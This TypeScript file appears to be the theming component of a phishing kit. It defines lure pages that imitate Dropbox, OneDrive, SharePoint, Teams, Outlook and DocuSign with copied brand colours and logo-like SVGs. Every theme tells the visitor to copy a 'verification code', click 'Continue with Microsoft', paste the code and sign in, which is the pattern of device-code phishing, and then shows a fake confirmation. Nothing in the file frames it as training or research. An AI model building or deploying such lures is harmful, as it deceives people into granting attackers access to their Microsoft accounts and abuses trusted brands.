export interface LinkTheme {
  id: string;
  label: string;
  pageTitle: string;
  primaryColor: string;
  hoverColor: string;
  bgTint: string;
  logo: string; // SVG string
  heading: string;
  subtitle: string;
  codeLabel: string;
  buttonText: string;
  steps: string[];
  successHeading: string;
  successMessage: string;
  againLabel: string;
}

export const THEMES: Record<string, LinkTheme> = {
  dropbox: {
    id: "dropbox",
    label: "Dropbox",
    pageTitle: "Dropbox - Secure file access",
    primaryColor: "#0061FF",
    hoverColor: "#0050d4",
    bgTint: "#f7f5f2",
    logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none"><path d="M14.4 4L4 10.8L14.4 17.6L24 10.8Z" fill="#0061FF"/><path d="M4 24.4L14.4 31.2L24 24.4L14.4 17.6Z" fill="#0061FF"/><path d="M24 24.4L33.6 31.2L44 24.4L33.6 17.6Z" fill="#0061FF"/><path d="M44 10.8L33.6 4L24 10.8L33.6 17.6Z" fill="#0061FF"/><path d="M14.4 33.2L24 26.4L33.6 33.2L24 40Z" fill="#0061FF"/></svg>`,
    heading: "Verify your identity",
    subtitle: "To access the shared files, verify your identity by signing in with your Microsoft account.",
    codeLabel: "Verification Code",
    buttonText: "Continue with Microsoft",
    steps: [
      "Copy the verification code above",
      "Click Continue with Microsoft below",
      "Paste the code when prompted",
      "Sign in with your account",
    ],
    successHeading: "Identity verified",
    successMessage: "Your account has been successfully verified. You can now close this window.",
    againLabel: "Verify another account",
  },

  onedrive: {
    id: "onedrive",
    label: "OneDrive",
    pageTitle: "OneDrive - Sign in to access shared files",
    primaryColor: "#0078D4",
    hoverColor: "#106EBE",
    bgTint: "#f3f6fc",
    logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none"><path d="M19.5 36h18.7c3.2 0 5.8-2.6 5.8-5.8 0-2.8-2-5.2-4.7-5.7.1-.5.2-1 .2-1.5 0-4.4-3.6-8-8-8-1.5 0-2.9.4-4.1 1.1C25.8 13.2 22.5 11 18.7 11c-5.2 0-9.5 4-9.9 9.1C5.6 21.3 3 24.5 3 28.3 3 32.5 6.3 36 10.4 36h9.1z" fill="#0078D4"/><path d="M31.5 20c-1.5 0-2.9.4-4.1 1.1C25.8 18.2 22.5 16 18.7 16c-5.2 0-9.5 4-9.9 9.1C5.6 26.3 3 29.5 3 33.3 3 37.5 6.3 41 10.4 41h21.1c3.2 0 5.8-2.6 5.8-5.8 0-2.8-2-5.2-4.7-5.7.1-.5.2-1 .2-1.5 0-4.4-3.6-8-8-8z" fill="#0364B8" opacity="0.8"/></svg>`,
    heading: "Sign in to access your files",
    subtitle: "The file owner has shared content with you. Sign in with your Microsoft account to access it.",
    codeLabel: "Access Code",
    buttonText: "Sign in with Microsoft",
    steps: [
      "Copy the access code above",
      "Click Sign in with Microsoft below",
      "Paste the code when prompted",
      "Sign in with your Microsoft account",
    ],
    successHeading: "Access granted",
    successMessage: "You now have access to the shared files. You can close this window.",
    againLabel: "Sign in with another account",
  },

  sharepoint: {
    id: "sharepoint",
    label: "SharePoint",
    pageTitle: "SharePoint - Access shared document",
    primaryColor: "#038387",
    hoverColor: "#026d70",
    bgTint: "#f0f8f8",
    logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none"><circle cx="24" cy="18" r="14" fill="#038387"/><circle cx="16" cy="30" r="11" fill="#03787C" opacity="0.9"/><circle cx="22" cy="36" r="8" fill="#026d70" opacity="0.8"/><text x="24" y="23" text-anchor="middle" fill="white" font-size="14" font-weight="bold" font-family="Segoe UI, sans-serif">S</text></svg>`,
    heading: "Access shared document",
    subtitle: "You've been invited to access a SharePoint document. Verify your identity to continue.",
    codeLabel: "Verification Code",
    buttonText: "Continue with Microsoft",
    steps: [
      "Copy the verification code above",
      "Click Continue with Microsoft below",
      "Enter the code when prompted",
      "Sign in with your organization account",
    ],
    successHeading: "Document access granted",
    successMessage: "Your identity has been verified. You can now access the shared document.",
    againLabel: "Verify another account",
  },

  teams: {
    id: "teams",
    label: "Microsoft Teams",
    pageTitle: "Microsoft Teams - Join shared workspace",
    primaryColor: "#6264A7",
    hoverColor: "#525499",
    bgTint: "#f5f5fb",
    logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none"><rect x="6" y="10" width="28" height="28" rx="3" fill="#6264A7"/><circle cx="38" cy="16" r="6" fill="#7B83EB"/><rect x="32" y="22" width="12" height="14" rx="2" fill="#7B83EB" opacity="0.9"/><path d="M14 20h12M14 25h8M14 30h10" stroke="white" stroke-width="1.5" stroke-linecap="round"/><circle cx="20" cy="14" r="0" fill="white"/></svg>`,
    heading: "Join shared workspace",
    subtitle: "You've been invited to a Teams workspace. Sign in with your Microsoft account to join.",
    codeLabel: "Join Code",
    buttonText: "Sign in with Microsoft",
    steps: [
      "Copy the join code above",
      "Click Sign in with Microsoft below",
      "Enter the code when prompted",
      "Sign in with your account",
    ],
    successHeading: "Successfully joined",
    successMessage: "You have been added to the workspace. You can now close this window.",
    againLabel: "Join with another account",
  },

  outlook: {
    id: "outlook",
    label: "Outlook",
    pageTitle: "Outlook - Verify your email account",
    primaryColor: "#0078D4",
    hoverColor: "#106EBE",
    bgTint: "#f3f6fc",
    logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none"><rect x="2" y="10" width="26" height="28" rx="2" fill="#0078D4"/><ellipse cx="15" cy="24" rx="8" ry="7" fill="#0078D4" stroke="white" stroke-width="1.5"/><path d="M28 14h17v20a2 2 0 01-2 2H28V14z" fill="#0078D4" opacity="0.7"/><path d="M28 14l10 9-10 9V14z" fill="#0078D4" opacity="0.5"/><text x="15" y="28" text-anchor="middle" fill="white" font-size="12" font-weight="bold" font-family="Segoe UI, sans-serif">O</text></svg>`,
    heading: "Verify your email account",
    subtitle: "To access shared mailbox content, verify your identity by signing in with your Microsoft account.",
    codeLabel: "Verification Code",
    buttonText: "Sign in with Microsoft",
    steps: [
      "Copy the verification code above",
      "Click Sign in with Microsoft below",
      "Paste the code when prompted",
      "Sign in with your Outlook account",
    ],
    successHeading: "Email verified",
    successMessage: "Your email account has been verified successfully. You can now close this window.",
    againLabel: "Verify another account",
  },

  docusign: {
    id: "docusign",
    label: "DocuSign",
    pageTitle: "DocuSign - Review and sign document",
    primaryColor: "#FF5722",
    hoverColor: "#E64A19",
    bgTint: "#fff8f5",
    logo: `<svg width="48" height="48" viewBox="0 0 48 48" fill="none"><rect x="8" y="4" width="32" height="40" rx="3" fill="#FF5722"/><path d="M16 18l4 4 8-8" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/><line x1="16" y1="30" x2="32" y2="30" stroke="white" stroke-width="1.5" stroke-linecap="round"/><line x1="16" y1="35" x2="28" y2="35" stroke="white" stroke-width="1.5" stroke-linecap="round" opacity="0.7"/></svg>`,
    heading: "Review and sign document",
    subtitle: "A document is waiting for your review. Verify your identity to access and sign it.",
    codeLabel: "Access Code",
    buttonText: "Continue to sign",
    steps: [
      "Copy the access code above",
      "Click Continue to sign below",
      "Enter the code when prompted",
      "Sign in to access your document",
    ],
    successHeading: "Identity verified",
    successMessage: "You can now review and sign the document. You may close this window.",
    againLabel: "Verify another account",
  },
};

export const THEME_LIST = Object.values(THEMES);

export function getTheme(id: string): LinkTheme {
  return THEMES[id] || THEMES.dropbox;
}
